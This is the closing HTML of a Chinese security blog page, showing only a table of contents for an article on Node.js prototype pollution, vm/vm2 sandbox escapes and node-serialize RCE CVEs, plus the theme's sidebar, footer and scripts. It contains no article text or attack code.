href="#44-%E5%93%AA%E4%BA%9B%E6%83%85%E5%86%B5%E4%B8%8B%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%BC%9A%E8%A2%AB%E6%B1%A1%E6%9F%93"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 哪些情况下原型链会被污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-code-breaking-2018-thejs-%E5%88%86%E6%9E%90"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 Code-Breaking 2018 Thejs 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-tips"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 Tips</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%90%86%E8%A7%A3-%E7%AE%80%E5%8C%96%E7%89%88"><span class="toc-number">5.</span> <span class="toc-text">0x05 进一步理解-简化版</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 原型链污染原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-code-breaking-2018-thejs"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 Code-Breaking 2018 Thejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9Ecve-2017-5941"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 node-serialize反序列化RCE漏洞(CVE-2017-5941)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">6.</span> <span class="toc-text">0x06 vm沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#61-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86"><span class="toc-number">6.1.</span> <span class="toc-text">6.1 沙箱逃逸初识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#62-node%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A7%E8%A1%8C%E4%B8%BA%E4%BB%A3%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text">6.2 Node将字符串执行为代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#63-nodejs%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-number">6.3.</span> <span class="toc-text">6.3 Nodejs作用域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">6.4.</span> <span class="toc-text">6.4 vm沙箱逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#65-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E6%83%85%E5%86%B5"><span class="toc-number">6.5.</span> <span class="toc-text">6.5 vm沙箱逃逸的一些其他情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#66-vm2"><span class="toc-number">6.6.</span> <span class="toc-text">6.6 vm2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#67-vm2%E4%B8%AD%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="toc-number">6.7.</span> <span class="toc-text">6.7 vm2中的沙箱绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2019-10761"><span class="toc-number">6.7.1.</span> <span class="toc-text">CVE-2019-10761</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2021-23449"><span class="toc-number">6.7.2.</span> <span class="toc-text">CVE-2021-23449</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%B8%8A%E7%9A%84%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AAtrick"><span class="toc-number">6.7.3.</span> <span class="toc-text">知识星球上的另外一个trick</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#68-%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3"><span class="toc-number">6.8.</span> <span class="toc-text">6.8 简单理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#69-javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">6.9.</span> <span class="toc-text">6.9 javascript大小写特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#610-ctf%E9%A2%98%E5%AE%9E%E4%BE%8B-hacktm%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93nodejs%E9%A2%98"><span class="toc-number">6.10.</span> <span class="toc-text">6.10 CTF题实例 - Hacktm中的一道Nodejs题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-tips"><span class="toc-number">7.</span> <span class="toc-text">0x07 Tips</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#71-fs-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">7.1.</span> <span class="toc-text">7.1 fs 文件系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#72-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%B1%95%E5%BC%80"><span class="toc-number">7.2.</span> <span class="toc-text">7.2 全局变量展开</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#73-child_process"><span class="toc-number">7.3.</span> <span class="toc-text">7.3 child_process</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>